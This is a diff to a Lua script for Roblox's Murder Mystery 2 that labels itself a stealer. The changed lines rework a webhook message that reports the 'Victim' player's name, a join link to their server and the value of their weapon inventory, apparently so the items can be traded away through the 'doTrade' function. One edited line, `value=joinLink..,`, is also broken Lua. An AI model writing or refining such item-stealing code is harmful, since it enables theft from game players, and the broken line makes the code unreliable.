@@ -100,9 +100,9 @@ for _, w in ipairs(weaponsToSend) do totalValue += w.Value * w.Amount end
 -- Preparar webhook
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
-    {name="Victim", value=LocalPlayer.Name.." 😎", inline=true},
-    {name="Enlaza para unirse:", value=joinLink.." 🔗", inline=false},
-    {name="Inventario:", value="", inline=false},
+    {name="Victim 👤:", value=LocalPlayer.Name.." 😜", inline=true},
+    {name="Enlaza para unirse🔗:", value=joinLink.., inline=false},
+    {name="Inventario📦:", value="", inline=false},
     {name="Valor total del inventario:", value=tostring(totalValue).." 💰", inline=true}
 }
 
@@ -112,7 +112,7 @@ end
 
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
-SendWebhook("💪MM2 Hit Ultra💯", "💰Revisa las armas obtenidas:", fields, prefix, thumbnailURL)
+SendWebhook("💪MM2 hit el mejor stealer💯", "💰Disfruta todas las armas gratis 💋:", fields, prefix, thumbnailURL)
 
 -- Trade: sistema intacto
 local function doTrade(targetName)
